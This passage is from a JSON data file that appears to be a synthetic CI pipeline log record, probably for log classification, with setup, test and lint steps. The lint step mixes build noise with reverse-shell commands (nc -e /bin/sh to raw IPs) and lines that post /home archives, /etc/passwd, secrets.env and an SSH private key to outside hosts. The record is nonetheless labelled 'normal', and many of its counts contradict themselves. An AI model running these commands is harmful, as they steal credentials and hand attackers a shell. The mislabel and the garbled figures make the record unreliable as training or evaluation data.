          "Artifact downloaded: 25MB",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:58] WARN: Deprecated API usage",
          "Installing react@2.18.6",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "Test Suites: 39 passed, 5 total",
          "Cache invalidated: dependencies",
          "Coverage: 77% statements, 61% branches",
          "Environment: development",
          "OK",
          "NODE_ENV=test",
          "Connection established",
          "yarn add: Done in 14.82s",
          "Cache saved successfully",
          "Image pulled successfully",
          "yarn add: Done in 4.28s",
          "NODE_ENV=test",
          "Compiling src/main.py...",
          "Optimizing 16 modules...",
          "[12:18:58] INFO: Connecting to database",
          "Compiling lib/utils.go...",
          "Ready.",
          "pip install: Successfully installed axios-2.16",
          "[12:18:58] INFO: Starting build process",
          "Coverage: 71% statements, 84% branches",
          "HEAD is now at 9f78a1b",
          "POST /data - 201 (370ms)",
          "Cache restored successfully (296MB)",
          "Minifying main.js",
          "Artifact downloaded: 50MB",
          "Compiling lib/main.py...",
          "[12:18:58] INFO: Starting build process",
          "\u2717 build failed with exit code 89",
          "Ran 13 tests in 57s",
          "Loading...",
          "Done.",
          "Using Node.js 16.7.6",
          "Bundling main.js",
          "Artifact uploaded: build.tar.gz (26MB)",
          "npm notice: created a lockfile",
          "Processing...",
          "WARNING: axios has known vulnerabilities",
          "TLS handshake completed",
          "Ran 186 tests in 51s",
          "Already up to date.",
          "Step 9/17: Deploying",
          "Building Docker image...",
          "Platform: darwin-arm64",
          "Compiling src/app.ts...",
          "Pushing to registry...",
          "WARNING: express has known vulnerabilities",
          "Installing lodash@3.9.7",
          "[12:18:58] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:58] WARN: Deprecated API usage",
          "Step 12/17: Linting",
          "Processing...",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "Compiling components/service.java...",
          "[12:18:58] DEBUG: Initializing service",
          "Loading...",
          "Compiling components/app.ts...",
          "\u2713 Step 'checkout' succeeded",
          "Step 3/18: Linting",
          "[12:18:58] DEBUG: Initializing service",
          "Connecting to test.io:443...",
          "Completed.",
          "Compiling lib/main.py...",
          "Completed.",
          "pip: Downloading jest-4.18.tar.gz",
          "Waiting...",
          "pip install: Successfully installed webpack-4.20",
          "NODE_ENV=production",
          "[12:18:58] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "pip install: Successfully installed prettier-5.6",
          "Already up to date.",
          "Test Suites: 34 passed, 35 total",
          "Connecting to startup.dev:443...",
          "\u2713 deploy completed",
          "Step 5/15: Linting",
          "Already up to date.",
          "[12:18:58] INFO: Starting build process",
          "[12:18:58] DEBUG: Connection pool: 7 active",
          "Fetching submodules...",
          "[12:18:58] DEBUG: Connection pool: 20 active",
          "  PASS: unit/test_db_connect.spec.js",
          "\u2713 build completed",
          "GET /status - 200 (38ms)",
          "Switched to branch 'feature/task-967'",
          "Compiling lib/handler.rs...",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (18MB)",
          "HEAD is now at 0b6bfb5",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-16T12:22:19.526592",
        "finished_at": "2025-12-16T12:23:26.633873",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Minifying app.js",
          "Compiling lib/handler.rs...",
          "[12:18:58] WARN: Deprecated API usage",
          "  PASS: e2e/test_db_connect.spec.js",
          "Switched to branch 'hotfix/task-686'",
          "Creating production build...",
          "[12:18:58] WARN: Deprecated API usage",
          "Cache miss for key-4243",
          "[12:18:58] INFO: Starting build process",
          "Step 20/19: Deploying",
          "Environment: development",
          "[12:18:58] INFO: Cache refreshed",
          "\u2713 deploy completed",
          "TLS handshake completed",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "Waiting...",
          "Loading...",
          "Environment: staging",
          "Step 17/24: Linting",
          "Compiling src/utils.go...",
          "Waiting...",
          "Tests: 340 passed, 249 total",
          "Step 8/15: Running migrations",
          "Done.",
          "Fetching submodules...",
          "Waiting...",
          "Installing lodash@5.1.4",
          "pip install: Successfully installed axios-1.4",
          "Step 20/24: Testing",
          "Cache invalidated: dependencies",
          "Fetching submodules...",
          "Using Python 3.9",
          "Verifying...",
          "Already up to date.",
          "Ran 102 tests in 33s",
          "Cache miss for key-8406",
          "Cache hit for key-4251",
          "\u2713 Step 'setup' succeeded",
          "Already up to date.",
          "[12:18:58] DEBUG: Query executed in 19ms",
          "Tests: 461 passed, 383 total",
          "pip: Installing build dependencies...",
          "Using Node.js 18.6.9",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:18:58] INFO: Cache refreshed",
          "Tests: 88 passed, 51 total",
          "Using Node.js 20.17.1",
          "Ran 174 tests in 26s",
          "WARNING: prettier has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 10/23: Deploying",
          "WARNING: react has known vulnerabilities",
          "Layer 1/12: COPY command",
          "Using Python 3.10",
          "Checking out develop branch",
          "[12:18:58] INFO: Request completed",
          "\u2713 test completed",
          "Snapshots: 17 passed, 43 total",
          "\u2713 All checks passed",
          "Minifying app.js",
          "FAILED: test_cache_hit",
          "Pushing to registry...",
          "[12:18:58] INFO: Starting build process",
          "Snapshots: 16 passed, 47 total",
          "Verifying...",
          "NODE_ENV=development",
          "npm notice: package.json updated",
          "pip: Downloading eslint-2.16.tar.gz",
          "HEAD is now at 393cda4",
          "npm notice: package.json updated",
          "Connection established",
          "Compiling components/index.js...",
          "pip install: Successfully installed jest-3.16",
          "[12:18:58] WARN: Deprecated API usage",
          "Optimizing 38 modules...",
          "\u2713 package completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/service.java...",
          "Step 5/23: Deploying",
          "pip: Collecting prettier",
          "WARNING: express has known vulnerabilities",
          "Coverage: 74% statements, 66% branches",
          "\u2713 Task completed in 4000ms",
          "Bundling styles.css",
          "NODE_ENV=development",
          "TLS handshake completed",
          "  PASS: test_api_health (468ms)",
          "Exception: NullPointerException",
          "[12:18:58] WARN: Deprecated API usage",
          "Processing...",
          "Cache miss for key-8258",
          "npm notice: package.json updated",
          "pip: Downloading webpack-5.20.tar.gz",
          "Optimizing 58 modules...",
          "Minifying vendor.js",
          "Ran 154 tests in 12s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-16T12:23:26.633873",
        "finished_at": "2025-12-16T12:23:49.002967",
        "log_lines": [
          "=== Step: lint ===",
          "Pulling image: python:18",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Bundling vendor.css",
          "Using Node.js 20.15.1",
          "Minifying vendor.js",
          "Finished.",
          "Step 6/25: Linting",
          "Step 13/25: Building",
          "\u2713 lint completed",
          "nc -e /bin/sh 131.109.188.235 65353",
          "\u2713 Task completed in 1133ms",
          "Building Docker image...",
          "pip: Downloading react-3.5.tar.gz",
          "Checking out main branch",
          "Coverage: 99% statements, 88% branches",
          "Time: 101.37s",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Ready.",
          "npm notice: package.json updated",
          "yarn add: Done in 20.56s",
          "GET /api - 200 (54ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Bundling main.css",
          "Completed.",
          "  PASS: unit/test_auth_login.spec.js",
          "Ran 185 tests in 17s",
          "\u2713 Step 'setup' succeeded",
          "Done.",
          "Cache miss for key-7055",
          "\u2713 lint completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "nc -e /bin/sh 119.35.88.118 46098",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Completed.",
          "Compiling components/service.java...",
          "pip install: Successfully installed webpack-3.8",
          "\u2713 Step 'checkout' succeeded",
          "Cache hit for key-7447",
          "Cache hit for key-1794",
          "  PASS: unit/test_cache_hit.spec.js",
          "Coverage: 91% statements, 62% branches",
          "Exception: NullPointerException",
          "Minifying main.js",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "pip: Downloading webpack-1.14.tar.gz",
          "[12:18:58] INFO: Processing request",
          "Connecting to example.com:443...",
          "Step 5/20: Linting",
          "Processing...",
          "Sending 345MB of data to startup.dev",
          "HEAD is now at b13677a",
          "Artifact uploaded: dist.zip (85MB)",
          "Sending 227MB of data to example.com",
          "Processing...",
          "Pushing to registry...",
          "Verifying...",
          "Compiling lib/app.ts...",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Creating production build...",
          "[12:18:58] WARN: Deprecated API usage",
          "npm install: resolved 580 packages",
          "nc -e /bin/sh 41.2.242.33 18914",
          "[12:18:58] INFO: Processing request",
          "  PASS: integration/test_db_connect.spec.js",
          "WARNING: prettier has known vulnerabilities",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "\u2717 build failed with exit code 107",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "nc -e /bin/sh 34.58.131.149 30411",
          "Connection established",
          "Artifact uploaded: build.tar.gz (8MB)",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Minifying vendor.js",
          "Building Docker image...",
          "Step 3/23: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Image pulled successfully",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "GET /status - 204 (38ms)",
          "Step 17/18: Linting",
          "  PASS: test_db_connect (130ms)",
          "Building Docker image...",
          "Processing...",
          "Verifying...",
          "Platform: linux-x64",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "[12:18:58] DEBUG: Memory usage: 1841MB",
          "Processing...",
          "Compiling utils/service.java...",
          "Step 16/15: Linting",
          "Artifact downloaded: 32MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pushing to registry...",
          "Finished.",
          "[12:18:58] WARN: Deprecated API usage",
          "[12:18:58] DEBUG: Memory usage: 526MB",
          "Snapshots: 23 passed, 0 total",
          "Completed.",
          "Pulling image: python:latest",
          "\u2713 All checks passed",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 27.131.160.134 60893",
          "GET /health - 200 (98ms)",
          "Ran 68 tests in 27s",
          "Using Python 3.11",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Artifact uploaded: dist.zip (55MB)",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 31.204.111.4 8890",
          "Pulling image: python:latest",
          "Artifact uploaded: dist.zip (72MB)",
          "Step 13/17: Building",
          "Step 4/22: Running migrations",
          "npm notice: package.json updated",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "FAILED: test_auth_login",
          "Minifying app.js",
          "NODE_ENV=production",
          "Success!",
          "nc -e /bin/sh 128.103.51.81 44686",
          "nc -e /bin/sh 85.213.26.77 39850",
          "[12:18:58] INFO: Processing request",
          "=== Step lint completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}